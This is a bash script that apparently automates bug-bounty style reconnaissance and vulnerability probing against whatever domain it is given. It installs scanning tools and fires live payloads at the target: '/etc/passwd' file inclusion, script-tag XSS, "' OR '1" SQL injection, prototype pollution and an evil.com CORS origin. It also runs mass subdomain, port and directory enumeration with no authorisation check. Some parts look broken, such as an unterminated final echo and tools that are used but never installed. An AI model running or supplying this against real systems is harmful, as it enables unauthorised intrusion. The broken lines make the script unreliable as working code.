#!/bin/bash

# ASCII Art for Wolf Face
echo "
  / \__
 (    @\___
 /         O
/   (_____/
/_____/   U
"

# Function to check if a tool is installed, and install it if not
check_and_install() {
    local tool=$1
    local install_command=$2

    if ! command -v "$tool" &> /dev/null; then
        echo "[*] $tool not found. Installing..."
        eval "$install_command"
        if ! command -v "$tool" &> /dev/null; then
            echo "[!] Failed to install $tool. Exiting."
            exit 1
        fi
    else
        echo "[*] $tool is already installed."
    fi
}

# Install required tools if not already installed
check_and_install "curl" "sudo apt-get install -y curl"
check_and_install "grep" "sudo apt-get install -y grep"
check_and_install "awk" "sudo apt-get install -y gawk"
check_and_install "sed" "sudo apt-get install -y sed"
check_and_install "sort" "sudo apt-get install -y coreutils"
check_and_install "amass" "GO111MODULE=on go install -v github.com/OWASP/Amass/v3/...@latest"
check_and_install "assetfinder" "GO111MODULE=on go install -v github.com/tomnomnom/assetfinder@latest"
check_and_install "subfinder" "GO111MODULE=on go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
check_and_install "httpx" "GO111MODULE=on go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"
check_and_install "waybackurls" "GO111MODULE=on go install -v github.com/tomnomnom/waybackurls@latest"
check_and_install "gau" "GO111MODULE=on go install -v github.com/lc/gau@latest"
check_and_install "paramspider" "GO111MODULE=on go install -v github.com/devanshbatham/ParamSpider@latest"
check_and_install "gf" "GO111MODULE=on go install -v github.com/tomnomnom/gf@latest"
check_and_install "qsreplace" "GO111MODULE=on go install -v github.com/tomnomnom/qsreplace@latest"
check_and_install "dalfox" "GO111MODULE=on go install -v github.com/hahwul/dalfox@latest"
check_and_install "shuffledns" "GO111MODULE=on go install -v github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"
check_and_install "dnsx" "GO111MODULE=on go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
check_and_install "naabu" "GO111MODULE=on go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
check_and_install "katana" "GO111MODULE=on go install -v github.com/projectdiscovery/katana/cmd/katana@latest"
check_and_install "nuclei" "GO111MODULE=on go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest"
check_and_install "dirsearch" "git clone https://github.com/maurosoria/dirsearch.git && cd dirsearch && python3 setup.py install"

# Function to check Local File Inclusion (LFI) vulnerability
check_lfi() {
    local target=$1

    echo "[*] Checking for LFI vulnerabilities on $target..."

    gau $target | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

    echo "[*] LFI check completed for $target"
}

# Function to check for Open Redirect vulnerabilities
check_open_redirect() {
    local target=$1
    local lhost=$2

    echo "[*] Checking for Open Redirect vulnerabilities on $target..."

    gau $target | gf redirect | qsreplace "$lhost" | xargs -I% -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $lhost" && echo "VULN! %"'

    echo "[*] Open Redirect check completed for $target"
}

# Function to check for vulnerabilities using gospider, qsreplace, and dalfox
check_with_gospider() {
    local urls_file=$1
    local output_file=$2

    echo "[*] Running gospider and dalfox for vulnerability detection..."

    gospider -S "$urls_file" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' | grep "=" | qsreplace -a | dalfox pipe | tee "$output_file"

    echo "[*] gospider and dalfox check completed. Results saved in $output_file"
}

# Function to check for subdomain enumeration, HTTP response, and prototype pollution
check_subdomains_and_proto_pollution() {
    local target=$1
    local output_file=$2

    echo "[*] Checking subdomains and prototype pollution on $target..."

    subfinder -d "$target" -all -silent | httpx -silent -threads 300 | anew -q "$output_file"
    sed 's/$/\/?__proto__[testparam]=exploit\//' "$output_file" | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"

    echo "[*] Subdomain and prototype pollution check completed. Results saved in $output_file"
}

# Function to check for JavaScript variables and construct potential XSS payloads
check_js_vars_for_xss() {
    local target=$1

    echo "[*] Checking for JavaScript variables and potential XSS payloads on $target..."

    assetfinder --subs-only "$target" | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do
        vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9_]+" | sed -e 's, var, '"$url"'?,g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g')
        echo -e "\e[1;33m$url\n" "\e[1;32m$vars"
    done

    echo "[*] JavaScript variable check for potential XSS completed on $target"
}

# Function to check for CORS vulnerability
check_cors() {
    local target=$1

    echo "[*] Checking for CORS vulnerabilities on $target..."

    gau "$target" | while read url; do
        target=$(curl -sIH "Origin: https://evil.com" -X GET "$url")
        if echo "$target" | grep -q 'https://evil.com'; then
            echo "[Potential CORS Found] $url"
        else
            echo "Nothing on $url"
        fi
    done

    echo "[*] CORS check completed for $target"
}

# Function to check for XSS vulnerabilities using waybackurls
check_xss_with_waybackurls() {
    local target=$1

    echo "[*] Checking for XSS vulnerabilities on $target using waybackurls..."

    waybackurls $target | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do
        curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"
    done

    echo "[*] XSS check with waybackurls completed for $target"
}

# Function to perform subdomain enumeration, DNS resolution, port scanning, and vulnerability scanning
perform_full_scan() {
    local target=$1

    echo "[*] Performing full scan on $target..."

    # Subdomain enumeration
    subfinder -d "$target" -all | anew subs.txt
    shuffledns -d "$target" -r resolvers.txt -w n0kovo_subdomains_huge.txt | anew subs.txt

    # DNS resolution
    dnsx -l subs.txt -r resolvers.txt | anew resolved.txt

    # Port scanning
    naabu -l resolved.txt -nmap -rate 5000 | anew ports.txt

    # HTTP probing
    httpx -l ports.txt | anew alive.txt

    # Vulnerability scanning with katana
    katana -list alive.txt -silent -nc -jc -kf all -fx -xhr -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -aff | anew urls.txt

    # Nuclei for vulnerability scanning
    nuclei -l urls.txt -es info,unknown -ept ssl -ss template-spray | anew nuclei.txt

    echo "[*] Full scan completed. Results saved in subs.txt, resolved.txt, ports.txt, alive.txt, urls.txt, nuclei.txt"
}

# Function to perform directory and file enumeration with dirsearch
perform_dirsearch() {
    local urls_file=$1
    local output_file=$2

    echo "[*] Running dirsearch for directory and file enumeration..."

    dirsearch -l "$urls_file" -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o "$output_file"

    echo "[*] Directory and file enumeration completed. Results saved in $output_file"
}

# Function to check for potential SQL injection vulnerabilities
check_sql_injection() {
    local file=$1

    echo "[*] Checking for potential SQL injection vulnerabilities..."

    grep "=" "$file" | qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \
    printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"

    echo "[*] SQL injection check completed"
}

# Define target
TARGET=$1
LHOST=${LHOST:-"http://example.com"}

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

# Create URLs file for gospider
URLS_FILE="urls_$TARGET.txt"
SUBDOMAINS_FILE="subdomains_$TARGET.txt"
gau $TARGET > "$URLS_FILE"

# Start LFI check
check_lfi $TARGET

# Start Open Redirect check
check_open_redirect $TARGET $LHOST

# Start gospider and dalfox check
check_with_gospider "$URLS_FILE" "gospider_dalfox_$TARGET.txt"

# Start subdomain and prototype pollution check
check_subdomains_and_proto_pollution $TARGET "$SUBDOMAINS_FILE"

# Start JavaScript variable check for potential XSS
check_js_vars_for_xss $TARGET

# Start CORS check
check_cors $TARGET

# Start XSS check with waybackurls
check_xss_with_waybackurls $TARGET

# Perform full scan
perform_full_scan $TARGET

# Perform directory and file enumeration
perform_dirsearch "$URLS_FILE" "dirsearch_$TARGET.txt"

# Check for SQL injection vulnerabilities
check_sql_injection "$URLS_FILE"

# Clean up URLs file
rm "$URLS_FILE"

echo "[[GREAT POWER COMES, GREAT RESPONSIBILITY.......!!  {'YASH LONEWOLF'}]]
